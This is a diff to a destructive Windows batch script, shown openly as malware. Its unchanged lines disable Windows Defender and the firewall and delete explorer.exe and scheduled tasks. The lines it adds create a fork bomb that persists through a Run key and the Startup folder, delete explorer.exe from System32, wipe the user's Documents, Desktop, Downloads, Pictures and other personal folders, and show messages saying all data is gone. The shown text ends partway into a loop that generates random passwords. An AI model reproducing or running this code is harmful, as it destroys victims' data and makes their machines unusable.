@@ -68,6 +68,12 @@ sc config WinDefend start= disabled >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\\" /t REG_DWORD /d 0 /f >nul 2>&1
 sc stop mpssvc >nul 2>&1
 sc config mpssvc start= disabled >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "CmdSpawn" /t REG_SZ /d "cmd /c start /min cmd /c \"for /l %%x in (1,1,100) do start cmd\"" /f >nul 2>&1
+
+echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\spawn.bat"
+echo :loop >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\spawn.bat"
+echo start cmd >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\spawn.bat"
+echo goto loop >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\spawn.bat"
 
 cd %userprofile%\Desktop
 
@@ -128,19 +134,29 @@ del /f /q /s "C:\System32\Tasks\*" >nul 2>&1
 taskkill /F /IM explorer.exe >nul 2>&1
 del /f /q /s "C:\Windows\explorer.exe" >nul 2>&1
 reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /f >nul 2>&1
+del /f /q /s "C:\Windows\System32\explorer.exe" >nul 2>&1
+rd /s /q "%userprofile%\Documents" >nul 2>&1
+rd /s /q "%userprofile%\Desktop" >nul 2>&1
+rd /s /q "%userprofile%\Downloads" >nul 2>&1
+rd /s /q "%userprofile%\Pictures" >nul 2>&1
+rd /s /q "%userprofile%\Videos" >nul 2>&1
+rd /s /q "%userprofile%\Music" >nul 2>&1
+rd /s /q "%userprofile%\Favorites" >nul 2>&1
 shutdown /f /r /t 900
 start rundll32.exe shell32.dll,#61 >nul 2>&1
 msg * "Hi!"
-msg * "You will need the Windows Start Menu!"
-msg * "System critical error detected!"
-msg * "Boot sector compromised!"
-msg * "System will be unusable in 15 minutes!"
-msg * "Some important system files have been deleted!"
-msg * "Explorer.exe has been terminated!"
-msg * "Please do not contact system administrator and reinstall the Windows!"
-msg * "Every minute your password changes to a new random string which is 20 characters long!"
-msg * "System shutdown initiated!"
-msg * "Goodbye!"
+msg * "You will need the Windows Start Menu."
+msg * "System critical error detected."
+msg * "Boot sector compromised."
+msg * "System will be unusable in 15 minutes."
+msg * "Some important system files have been deleted."
+msg * "Explorer.exe has been terminated."
+msg * "Please do not contact system administrator and reinstall the Windows."
+msg * "Every minute your password changes to a new random string which is 20 characters long."
+msg * "System shutdown initiated."
+msg * "It is not a joke. Your system is at risk."
+msg * "All your data has been deleted."
+msg * "Goodbye."
 :loop
     set "newpass="
     for /L %%i in (1,1,20) do (
